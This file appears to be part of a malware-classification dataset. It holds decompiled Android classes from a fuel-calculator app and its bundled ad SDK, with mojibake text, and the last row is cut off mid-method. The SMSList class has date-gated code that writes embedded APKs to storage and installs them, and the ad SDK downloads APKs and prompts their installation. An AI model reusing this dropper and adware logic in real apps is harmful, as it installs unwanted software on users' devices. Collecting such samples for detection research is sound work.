"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\PublicClass2.code","public class PublicClass2 extends Activity {   public void SetPreferences(  String name,  String Value){     SharedPreferences.Editor sharedata=getSharedPreferences(""data"",0).edit();     sharedata.putString(name,Value);     sharedata.commit();   }   public String GetPreferences(  String name,  String DefaultValue){     SharedPreferences sharedata=getSharedPreferences(""data"",0);     return sharedata.getString(name,DefaultValue);   }   public void LocatableMessage(  String MessageContent,  int X,  int Y){     Toast toast=Toast.makeText(getApplicationContext(),MessageContent,1);     toast.setGravity(49,X,Y);     toast.show();   }   public String EnsureLength(  int number2){     return new StringBuilder(String.valueOf(number2)).toString().length() < 2 ? ""0"" + number2 : new StringBuilder(String.valueOf(number2)).toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\R.code","public final class R { public static final class anim {     public static final int gif_ku=0x7f040000;   } public static final class attr {   } public static final class color {     public static final int Background=0x7f060001;     public static final int Button1=0x7f060003;     public static final int DarkGreenButton=0x7f060002;     public static final int White=0x7f060000;   } public static final class dimen {     public static final int activity_horizontal_margin=0x7f070000;     public static final int activity_vertical_margin=0x7f070001;   } public static final class drawable {     public static final int background=0x7f020000;     public static final int button=0x7f020001;     public static final int button_default=0x7f020002;     public static final int button_pressed=0x7f020003;     public static final int checkbox_normal=0x7f020004;     public static final int checkbox_select=0x7f020005;     public static final int edit_text=0x7f020006;     public static final int edit_text_default=0x7f020007;     public static final int edit_text_pressed=0x7f020008;     public static final int expand=0x7f020009;     public static final int ic_launcher=0x7f02000a;     public static final int ku_1=0x7f02000b;     public static final int ku_2=0x7f02000c;     public static final int ku_3=0x7f02000d;     public static final int ku_4=0x7f02000e;     public static final int radio_button=0x7f02000f;     public static final int text_view=0x7f020010;     public static final int text_view_default=0x7f020011;   } public static final class id {     public static final int AverageConsumptionTV=0x7f0b0018;     public static final int AverageFuelTV=0x7f0b0013;     public static final int Button01=0x7f0b000a;     public static final int Button02=0x7f0b000b;     public static final int Button03=0x7f0b000d;     public static final int Button04=0x7f0b0010;     public static final int Button05=0x7f0b000f;     public static final int CapacityET=0x7f0b001a;     public static final int ContentET=0x7f0b0008;     public static final int ContentTV=0x7f0b0023;     public static final int CountButton=0x7f0b0001;     public static final int DistanceET=0x7f0b0019;     public static final int FrequencyTV=0x7f0b0017;     public static final int LinearLayout01=0x7f0b000c;     public static final int LinearLayout02=0x7f0b000e;     public static final int NumberET=0x7f0b001c;     public static final int NumberTV=0x7f0b0012;     public static final int OilPricesET=0x7f0b001b;     public static final int Options1=0x7f0b0024;     public static final int Options2=0x7f0b0025;     public static final int ProgressBar01=0x7f0b0009;     public static final int SWGJButton=0x7f0b0004;     public static final int TextView01=0x7f0b0007;     public static final int TextView02=0x7f0b0015;     public static final int TextView03=0x7f0b0014;     public static final int TextView06=0x7f0b0003;     public static final int TotalPriceET=0x7f0b0006;     public static final int TotalPriceTV=0x7f0b0011;     public static final int UnitPriceET=0x7f0b0005;     public static final int UnitPriceTV=0x7f0b0016;     public static final int UpdateTimeET=0x7f0b001d;     public static final int banner_parent_view=0x7f0b0000;     public static final int button1=0x7f0b001e;     public static final int button2=0x7f0b001f;     public static final int imageView1=0x7f0b0022;     public static final int ll_listview=0x7f0b0020;     public static final int progress=0x7f0b0021;     public static final int textView1=0x7f0b0002;   } public static final class layout {     public static final int add=0x7f030000;     public static final int alert_dialog=0x7f030001;     public static final int alert_dialog3=0x7f030002;     public static final int count_show=0x7f030003;     public static final int counter=0x7f030004;     public static final int edit=0x7f030005;     public static final int list=0x7f030006;     public static final int list_row=0x7f030007;     public static final int main_activity=0x7f030008;     public static final int progress=0x7f030009;     public static final int sms_show=0x7f03000a;   } public static final class menu {     public static final int main=0x7f0a0000;   } public static final class raw {     public static final int djsrj=0x7f050000;     public static final int yesllwzdq=0x7f050001;     public static final int youhaojisuanqi12306=0x7f050002;   } public static final class string {     public static final int Options1=0x7f080001;     public static final int Options2=0x7f080002;     public static final int app_name=0x7f080000;   } public static final class style {     public static final int AnimKu=0x7f090002;     public static final int AppBaseTheme=0x7f090000;     public static final int AppTheme=0x7f090001;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\raw.code","public static final class raw {   public static final int djsrj=0x7f050000;   public static final int yesllwzdq=0x7f050001;   public static final int youhaojisuanqi12306=0x7f050002; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\SMSList.code","public class SMSList extends PublicClass implements AdapterView.OnItemClickListener {   private EditText ETSearch;   private Button button1;   private Button button2;   private ListView listView=null;   private String DKJE_ET=""0"";   private int ClassId=0;   private int HKFS=0;   private String LiLvET=""0"";   private int DBId=0;   private String[] SMSSZ=new String[600];   private String key="""";   @Override protected void onResume(){     super.onResume();     StatService.onResume((Context)this);   }   @Override protected void onPause(){     super.onPause();     StatService.onPause((Context)this);   }   @Override public void onBackPressed(){     finish();     System.exit(0);   }   @Override protected void onCreate(  Bundle savedInstanceState){     requestWindowFeature(1);     getWindow().setFlags(1024,1024);     super.onCreate(savedInstanceState);     setContentView(R.layout.list);     BindingLayout();     initBannerAd();     Time t=new Time();     t.setToNow();     int year=t.year;     int monthly=t.month + 1;     int Day=t.monthDay;     int NowDate=StringOper.ToInt(String.valueOf(EnsureLength(year)) + EnsureLength(monthly) + EnsureLength(Day));     if (NowDate < 20150216) {       this.button2.setVisibility(8);     }     getIntent().getExtras();     this.DKJE_ET=StringOper.getListActivityString(this,""DKJE_ET"",""0"");     this.ClassId=StringOper.getListActivityString(this,""ClassId"",0);     this.HKFS=StringOper.getListActivityString(this,""HKFS"",0);     this.LiLvET=StringOper.getListActivityString(this,""LiLvET"",""0"");     SqliteOper SO=new SqliteOper(this,PublicClass.DatabaseFileDirectory,PublicClass.DatabaseFileName,R.raw.youhaojisuanqi12306);     Cursor cursor=SO.PublicSelect(""id,ClassId,UpdateTime,Content,UnitPrice,TotalPrice,Number"",""tb_SMS"","""",""order by id desc"");     List<Map<String,Object>> lists=new ArrayList<>();     int ig=0;     this.SMSSZ[0]=""title"";     Map<String,Object> map2=new HashMap<>();     map2.put(""TextView01"","""");     map2.put(""TextView02"",""æ—¥æœŸ"");     map2.put(""TextView03"",""æ€»é‡‘é¢�"");     lists.add(map2);     while (cursor.moveToNext()) {       ig++;       this.SMSSZ[ig]=cursor.getString(cursor.getColumnIndex(""id""));       Map<String,Object> map=new HashMap<>();       map.put(""TextView01"",String.valueOf(ig) + ""."");       map.put(""TextView02"",cursor.getString(cursor.getColumnIndex(""UpdateTime"")).split("" "")[0]);       map.put(""TextView03"",String.valueOf(cursor.getString(cursor.getColumnIndex(""TotalPrice""))) + ""å…ƒ"");       lists.add(map);     }     SimpleAdapter adapter=new SimpleAdapter(this,lists,R.layout.list_row,new String[]{""TextView01"",""TextView02"",""TextView03""},new int[]{R.id.TextView01,R.id.TextView02,R.id.TextView03});     setListAdapter(adapter);     this.listView=getListView();     this.listView.setOnItemClickListener(this);     SO.closeButDoNotDelete();     if (ig >= 2) {       int ig2=ig + 1;       this.SMSSZ[ig2]=""JE"";       Map<String,Object> map3=new HashMap<>();       map3.put(""TextView01"","""");       map3.put(""TextView02"",""åŠ æ²¹æ±‡æ€»ç»Ÿè®¡"");       map3.put(""TextView03"","""");       lists.add(map3);       this.SMSSZ[ig2 + 1]=""AD1"";       Map<String,Object> map5=new HashMap<>();       map5.put(""TextView01"","""");       map5.put(""TextView02"",""ç”Ÿæ—¥èŠ‚æ—¥å€’è®¡æ—¶"");       map5.put(""TextView03"","""");       lists.add(map5);     }     this.button1.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         SMSList.this.ToClassList2(Add.class,"""");       }     } );     this.button2.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         SMSList.this.ToClassList3();       }     } );   }   @Override public boolean onCreateOptionsMenu(  Menu menu){     return true;   }   @Override public void onItemClick(  AdapterView<?> parent,  View view,  int position,  long id){     new ArrayList();     if (StringOper.equals(this.SMSSZ[position],""AD1"")) {       ToClassList3b();     }     if (StringOper.equals(this.SMSSZ[position],""JE"")) {       ToClassList2(CountShow.class,"""");     }  else     if (!StringOper.equals(this.SMSSZ[position],""title"")) {       ShowAlertDialog("""",this.SMSSZ[position].split("","")[0]);     }   }   public void BindingLayout(){     this.button1=(Button)findViewById(R.id.button1);     this.button2=(Button)findViewById(R.id.button2);   }   public void ToClassList3(){     if (ApkOper.isAvilible(this,""com.src.zhang.YiErSanLingLiuWangZhiDaQuan"")) {       Intent i=new Intent();       ComponentName cn=new ComponentName(""com.src.zhang.YiErSanLingLiuWangZhiDaQuan"",""com.src.zhang.YiErSanLingLiuWangZhiDaQuan.MainActivity"");       i.setComponent(cn);       startActivityForResult(i,-1);       return;     }     String Path=String.valueOf(FileOper.GetSDDirectory()) + ""/db"";     String FilePath=String.valueOf(Path) + ""/yesllwzdq.apk"";     File file=new File(FilePath);     FileOper fo=new FileOper();     fo.deleteFile(file);     FileOper.MemoryFileToSD(this,""db"",""yesllwzdq.apk"",R.raw.yesllwzdq);     ApkOper.installApk(this,String.valueOf(FileOper.GetSDDirectory()) + ""db/"",""yesllwzdq.apk"");   }   public void ToClassList3b(){     if (ApkOper.isAvilible(this,""com.example.DaoJiShiRuanJian12345"")) {       Intent i=new Intent();       ComponentName cn=new ComponentName(""com.example.DaoJiShiRuanJian12345"",""com.example.DaoJiShiRuanJian12345.MainActivity"");       i.setComponent(cn);       startActivityForResult(i,-1);       return;     }     String Path=String.valueOf(FileOper.GetSDDirectory()) + ""db"";     String FilePath=String.valueOf(Path) + ""/djsrj.apk"";     File file=new File(FilePath);     FileOper fo=new FileOper();     fo.deleteFile(file);     FileOper.MemoryFileToSD(this,""db"",""djsrj.apk"",R.raw.djsrj);     ApkOper.installApk(this,String.valueOf(FileOper.GetSDDirectory()) + ""db/"",""djsrj.apk"");   }   public void ToClassList2(  Class<?> cls,  String idXC){     Intent intent=new Intent();     intent.setClass(this,cls);     intent.setFlags(67108864);     intent.putExtra(""id"",idXC);     startActivity(intent);   }   private void ShowAlertDialog(  String ClassIDXC,  final String idXC){     AlertDialog AlertDialog1=new AlertDialog.Builder(this).create();     AlertDialog1.show();     Window window1=AlertDialog1.getWindow();     window1.setContentView(R.layout.alert_dialog3);     Button Button02=(Button)window1.findViewById(R.id.Button02);     Button02.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         SMSList.this.ToClassList3();       }     } );     Button Button03=(Button)window1.findViewById(R.id.Button03);     Button03.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         SMSList.this.ToClassList3b();       }     } );     Button Button04=(Button)window1.findViewById(R.id.Button04);     Button04.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         SMSList.this.Delete(""tb_SMS"",""where id="" + idXC);         SMSList.this.ToClassList2(SMSList.class,"""");       }     } );     Button Button05=(Button)window1.findViewById(R.id.Button05);     Button05.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         SMSList.this.ToClassList2(Edit.class,idXC);       }     } );     Time t=new Time();     t.setToNow();     int year=t.year;     int monthly=t.month + 1;     int Day=t.monthDay;     int NowDate=StringOper.ToInt(String.valueOf(EnsureLength(year)) + EnsureLength(monthly) + EnsureLength(Day));     if (NowDate < 20150216) {       Button02.setVisibility(8);       Button03.setVisibility(8);     }   }   private void initBannerAd(){     FwBannerManager.init(this);     RelativeLayout layout=(RelativeLayout)findViewById(R.id.banner_parent_view);     FwBannerManager.loadBannerAD(this,layout,new FwBannerListener(){       @Override public void onSuccess(){       }       @Override public void onFailure(){       }     } );   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\SMSShow.code","public class SMSShow extends PublicClass2 {   private TextView ClassNameTV;   private TextView ContentTV;   private Button button1;   private Button button2;   private ImageView imageView1;   private int id=0;   private int ClassId=0;   private String Content="""";   private String name="""";   private String logo="""";   @Override protected void onResume(){     super.onResume();     StatService.onResume((Context)this);   }   @Override protected void onPause(){     super.onPause();     StatService.onPause((Context)this);   }   @Override protected void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     setContentView(R.layout.sms_show);     BindingLayout();     UpdateVersion();     Bundle bundle=getIntent().getExtras();     this.id=StringOper.ToInt(bundle.getString(""id""));     SqliteOper SO=new SqliteOper(this,PublicClass.DatabaseFileDirectory,PublicClass.DatabaseFileName,R.raw.youhaojisuanqi12306);     Cursor cursor=SO.PublicSelect(""name,logo,ClassId,Content"",""tb_SMS"",""where id="" + this.id,"""");     while (cursor.moveToNext()) {       try {         this.name=cursor.getString(cursor.getColumnIndex(""name""));         this.logo=cursor.getString(cursor.getColumnIndex(""logo""));         this.Content=cursor.getString(cursor.getColumnIndex(""Content""));       }  catch (      Exception e) {       }     }     SO.close();     setTitle(String.valueOf(this.name) + ""--"" + getString(R.string.app_name));     this.ContentTV.setText(""         "" + this.Content);     int id1=ResOper.getResourceId(this,this.logo,""drawable"",""com.example.YouHaoJiSuanQi12306"");     if (id1 != 0) {       this.imageView1.setImageResource(id1);     }  else {       this.imageView1.setVisibility(8);     }   }   public void BindingLayout(){     this.ContentTV=(TextView)findViewById(R.id.ContentTV);     this.imageView1=(ImageView)findViewById(R.id.imageView1);   }   protected void UpdateVersion(){     try {       if (NetworkOper.NetworkTest(this) != 0) {         Time t=new Time();         t.setToNow();         String hour=new StringBuilder(String.valueOf(t.hour)).toString();         String LastDownloadTime=GetPreferences(""YouHaoJiSuanQi12306LastDownloadTime"",""0"");         UpdateManager mUpdateManager=new UpdateManager(this);         if (StringOper.ToInt(LastDownloadTime) != StringOper.ToInt(hour)) {           mUpdateManager.downloadTxt();           SetPreferences(""YouHaoJiSuanQi12306LastDownloadTime"",hour);         }         double versionCode=StringOper.ToDouble(FileOper.dealFile(String.valueOf(FileOper.GetSDDirectory()) + ""YouHaoJiSuanQi12306/versionCode.txt""));         if (versionCode != 0.0d && versionCode > UpdateManager.versionCode) {           mUpdateManager.checkUpdateInfo();         }       }     }  catch (    Exception e) {     }   }   public void OpenUrl(  String Url){     Intent intent=new Intent();     intent.putExtra(""Url"",Url);     startActivity(intent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\string.code","public static final class string {   public static final int Options1=0x7f080001;   public static final int Options2=0x7f080002;   public static final int app_name=0x7f080000; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\style.code","public static final class style {   public static final int AnimKu=0x7f090002;   public static final int AppBaseTheme=0x7f090000;   public static final int AppTheme=0x7f090001; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.example.YouHaoJiSuanQi12306\UpdateManager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@48aa7350"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.a\a.code","public class a extends PagerAdapter {   private List<View> a;   public a(  List<View> list){     this.a=list;   }   @Override public void destroyItem(  ViewGroup viewGroup,  int i,  Object obj){     viewGroup.removeView((View)obj);   }   @Override public int getCount(){     return this.a.size();   }   @Override public int getItemPosition(  Object obj){     return -2;   }   @Override public Object instantiateItem(  ViewGroup viewGroup,  int i){     View view=this.a.get(i);     viewGroup.addView(view);     return view;   }   @Override public boolean isViewFromObject(  View view,  Object obj){     return view == obj;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\a.code","public class a implements View.OnClickListener {   final FwAdDetailActivity a;   public a(  FwAdDetailActivity fwAdDetailActivity){     this.a=fwAdDetailActivity;   }   @Override public void onClick(  View view){     AdInfo adInfo;     PackageManager packageManager=this.a.getPackageManager();     Intent intent=new Intent();     try {       adInfo=this.a.Z;       intent=packageManager.getLaunchIntentForPackage(adInfo.getPackageName());     }  catch (    ActivityNotFoundException e) {       e.printStackTrace();     }     this.a.startActivity(intent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\aa.code","public class aa implements Animation.AnimationListener {   final FwBoxDActivity a;   public aa(  FwBoxDActivity fwBoxDActivity){     this.a=fwBoxDActivity;   }   @Override public void onAnimationEnd(  Animation animation){     this.a.finish();   }   @Override public void onAnimationRepeat(  Animation animation){   }   @Override public void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\ab.code","public class ab implements View.OnClickListener {   final FwBoxDActivity a;   public ab(  FwBoxDActivity fwBoxDActivity){     this.a=fwBoxDActivity;   }   @Override public void onClick(  View view){     Animation animation;     RelativeLayout relativeLayout;     RelativeLayout relativeLayout2;     Animation animation2;     animation=this.a.c;     if (animation != null) {       relativeLayout=this.a.d;       if (relativeLayout != null) {         relativeLayout2=this.a.d;         animation2=this.a.c;         relativeLayout2.startAnimation(animation2);       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\ac.code","public class ac implements DialogInterface.OnClickListener {   final AppWallAdInfo a;   final FwBoxDActivity b;   public ac(  FwBoxDActivity fwBoxDActivity,  AppWallAdInfo appWallAdInfo){     this.b=fwBoxDActivity;     this.a=appWallAdInfo;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.cancel();     this.b.c(this.a);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\ad.code","public class ad implements DialogInterface.OnClickListener {   final FwBoxDActivity a;   public ad(  FwBoxDActivity fwBoxDActivity){     this.a=fwBoxDActivity;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.cancel();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\AdDetailActivity$DownloadProgressReceiver.code","public class AdDetailActivity$DownloadProgressReceiver extends BroadcastReceiver {   final FwAdDetailActivity a;   private File b;   public AdDetailActivity$DownloadProgressReceiver(  FwAdDetailActivity fwAdDetailActivity,  File file){     this.a=fwAdDetailActivity;     this.b=file;   }   @Override public void onReceive(  Context context,  Intent intent){     AdInfo adInfo;     int i;     ProgressBar progressBar;     ProgressBar progressBar2;     ProgressBar progressBar3;     Button button;     Button button2;     Button button3;     Button button4;     Bundle extras=intent.getExtras();     long j=extras.getLong(com.fw.tzthree.b.a.bk);     long j2=extras.getLong(com.fw.tzthree.b.a.bl);     int i2=extras.getInt(""adid"");     int i3=extras.getInt(com.fw.tzthree.b.a.ba);     adInfo=this.a.Z;     if (i2 == adInfo.getAdId().intValue()) {       i=this.a.aa;       if (i3 != i) {         return;       }       progressBar=this.a.A;       progressBar.setMax(Long.valueOf(j2).intValue());       progressBar2=this.a.A;       progressBar2.setProgress(Long.valueOf(j).intValue());       if (j == j2) {         progressBar3=this.a.A;         progressBar3.setVisibility(8);         button=this.a.w;         button.setVisibility(0);         button2=this.a.x;         button2.setVisibility(8);         button3=this.a.w;         button3.setText(""å®‰è£…"");         button4=this.a.w;         button4.setOnClickListener(new j(this));       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\ae.code","public class ae implements DialogInterface.OnClickListener {   final AppWallAdInfo a;   final FwBoxDActivity b;   public ae(  FwBoxDActivity fwBoxDActivity,  AppWallAdInfo appWallAdInfo){     this.b=fwBoxDActivity;     this.a=appWallAdInfo;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.cancel();     this.b.a(this.a);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\af.code","public class af implements DialogInterface.OnClickListener {   final FwBoxDActivity a;   public af(  FwBoxDActivity fwBoxDActivity){     this.a=fwBoxDActivity;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.cancel();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\ag.code","public class ag extends BroadcastReceiver {   final FwBoxDActivity a;   public ag(  FwBoxDActivity fwBoxDActivity){     this.a=fwBoxDActivity;   }   @Override public void onReceive(  Context context,  Intent intent){     Handler handler;     Handler handler2;     Bundle extras=intent.getExtras();     if (extras.getInt(com.fw.tzthree.b.a.ba) == BoxBusiness.b().getAdType()) {       handler=this.a.e;       Message obtainMessage=handler.obtainMessage(65673);       long j=extras.getLong(com.fw.tzthree.b.a.bk);       long j2=extras.getLong(com.fw.tzthree.b.a.bl);       obtainMessage.arg1=extras.getInt(""adid"");       obtainMessage.obj=((int)(((j * 1.0d) / j2) * 100.0d)) + ""%"";       handler2=this.a.e;       handler2.sendMessage(obtainMessage);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\ah.code","public class ah extends BaseAdapter {   final FwBoxDActivity a;   private List<AppWallAdInfo> b;   public ah(  FwBoxDActivity fwBoxDActivity,  List<AppWallAdInfo> list){     this.a=fwBoxDActivity;     this.b=list;   }   @Override public int getCount(){     return this.b.size();   }   @Override public Object getItem(  int i){     return this.b.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ai aiVar;     View view2;     if (view == null) {       ai aiVar2=new ai(this,null);       view2=new RelativeLayout(this.a);       view2.setLayoutParams(new AbsListView.LayoutParams(-1,com.fw.tzthree.d.n.a(this.a,70.0f)));       aiVar2.a=new SmartImageView(this.a);       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this.a,50.0f),com.fw.tzthree.d.n.a(this.a,50.0f));       layoutParams.addRule(14);       aiVar2.a.setLayoutParams(layoutParams);       aiVar2.b=new TextView(this.a);       RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-2);       layoutParams2.addRule(12);       layoutParams2.setMargins(com.fw.tzthree.d.n.a(this.a,5.0f),0,com.fw.tzthree.d.n.a(this.a,5.0f),0);       aiVar2.b.getPaint().setFakeBoldText(true);       aiVar2.b.setLayoutParams(layoutParams2);       aiVar2.b.setSingleLine();       aiVar2.b.setTextSize(11.0f);       aiVar2.b.setTextColor(-1);       aiVar2.b.setGravity(17);       aiVar2.a.setImageUrl(BoxBusiness.b().getSetting(this.a,BoxBusiness.b().getAdType()).getResourcesAddr() + this.b.get(i).getIcon());       ((ViewGroup)view2).addView(aiVar2.a);       ((ViewGroup)view2).addView(aiVar2.b);       view2.setTag(aiVar2);       aiVar=aiVar2;     }  else {       aiVar=(ai)view.getTag();       view2=view;     }     aiVar.b.setText(this.b.get(i).getAppName());     return view2;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\ai.code","class ai {   SmartImageView a;   TextView b;   final ah c;   private ai(  ah ahVar){     this.c=ahVar;   }   public ai(  ah ahVar,  y yVar){     this(ahVar);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\aj.code","class aj implements FwSplashAdListener {   final FwSActivity a;   public aj(  FwSActivity fwSActivity){     this.a=fwSActivity;   }   @Override public void onSplashDismiss(){     this.a.finish();   }   @Override public void onSplashLoadFailed(){     this.a.finish();   }   @Override public void onSplashPresent(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\al.code","class al extends WebViewClient {   final FwWebActivity a;   private al(  FwWebActivity fwWebActivity){     this.a=fwWebActivity;   }   @Override public void onPageFinished(  WebView webView,  String str){   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     super.onPageStarted(webView,str,bitmap);   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     super.onReceivedError(webView,i,str,str2);     Toast.makeText(this.a.getApplicationContext(),com.fw.tzthree.d.j.bv,0).show();   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     webView.loadUrl(str);     return true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\b.code","public class b implements View.OnClickListener {   final FwAdDetailActivity a;   public b(  FwAdDetailActivity fwAdDetailActivity){     this.a=fwAdDetailActivity;   }   @Override public void onClick(  View view){     Button button;     Button button2;     ProgressBar progressBar;     button=this.a.w;     button.setVisibility(8);     button2=this.a.x;     button2.setVisibility(8);     progressBar=this.a.A;     progressBar.setVisibility(0);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\c.code","public class c implements View.OnClickListener {   final File a;   final FwAdDetailActivity b;   public c(  FwAdDetailActivity fwAdDetailActivity,  File file){     this.b=fwAdDetailActivity;     this.a=file;   }   @Override public void onClick(  View view){     AdInfo adInfo;     boolean z;     AdInfo adInfo2;     int i;     DownloadInfo a;     DownloadSuccessInfo a2;     com.fw.tzthree.core.y yVar;     String str;     AdInfo adInfo3;     com.fw.tzthree.core.y yVar2;     int i2;     AdInfo adInfo4;     int i3;     AdInfo adInfo5;     AdInfo adInfo6;     int i4;     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(this.a),""application/vnd.android.package-archive"");     this.b.startActivity(intent);     com.fw.tzthree.db.a aVar=new com.fw.tzthree.db.a();     aVar.c(this.b);     adInfo=this.b.Z;     Iterator<DownloadInfo> it=aVar.b(adInfo.getPackageName()).iterator();     while (true) {       if (!it.hasNext()) {         z=false;         break;       }       DownloadInfo next=it.next();       Integer adId=next.getAdId();       adInfo6=this.b.Z;       if (adId == adInfo6.getAdId()) {         int intValue=next.getAdType().intValue();         i4=this.b.aa;         if (intValue == i4) {           z=true;           break;         }       }     }     FwAdDetailActivity fwAdDetailActivity=this.b;     adInfo2=this.b.Z;     i=this.b.aa;     a=fwAdDetailActivity.a(1,adInfo2,i,com.fw.tzthree.d.ab.a());     if (!z) {       yVar2=this.b.W;       yVar2.saveDownloadInfo(a);       FwAdDetailActivity fwAdDetailActivity2=this.b;       i2=this.b.aa;       com.fw.tzthree.core.y<?> commonBusiness=com.fw.tzthree.core.y.getCommonBusiness(fwAdDetailActivity2,i2);       FwAdDetailActivity fwAdDetailActivity3=this.b;       adInfo4=this.b.Z;       commonBusiness.postActionRequest(fwAdDetailActivity3,adInfo4,5);       FwAdDetailActivity fwAdDetailActivity4=this.b;       i3=this.b.aa;       com.fw.tzthree.core.y<?> commonBusiness2=com.fw.tzthree.core.y.getCommonBusiness(fwAdDetailActivity4,i3);       FwAdDetailActivity fwAdDetailActivity5=this.b;       adInfo5=this.b.Z;       commonBusiness2.postActionRequest(fwAdDetailActivity5,adInfo5,6);     }     a2=this.b.a(a);     yVar=this.b.W;     yVar.saveDownloadSuccessInfo(a2);     this.b.T=new Notification(R.drawable.stat_sys_download,""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",com.fw.tzthree.d.ab.a());     StringBuilder sb=new StringBuilder();     str=this.b.S;     StringBuilder append=sb.append(str);     adInfo3=this.b.Z;     SmartImageTask smartImageTask=new SmartImageTask(this.b.getApplicationContext(),new WebImage(append.append(adInfo3.getIcon()).toString()));     smartImageTask.setOnCompleteHandler(new d(this));     new Thread(smartImageTask).start();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\d.code","class d extends SmartImageTask.OnCompleteHandler {   final c a;   public d(  c cVar){     this.a=cVar;   }   @Override public void onComplete(  Bitmap bitmap){     Notification notification;     AdInfo adInfo;     Notification notification2;     AdInfo adInfo2;     Notification notification3;     NotificationManager notificationManager;     AdInfo adInfo3;     int i;     Notification notification4;     Notification notification5;     Bitmap bitmap2;     Notification notification6;     Notification notification7;     Bitmap bitmap3;     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(this.a.a),""application/vnd.android.package-archive"");     PendingIntent activity=PendingIntent.getActivity(this.a.b.getApplicationContext(),new Random().nextInt(1000),intent,134217728);     notification=this.a.b.T;     Context applicationContext=this.a.b.getApplicationContext();     adInfo=this.a.b.Z;     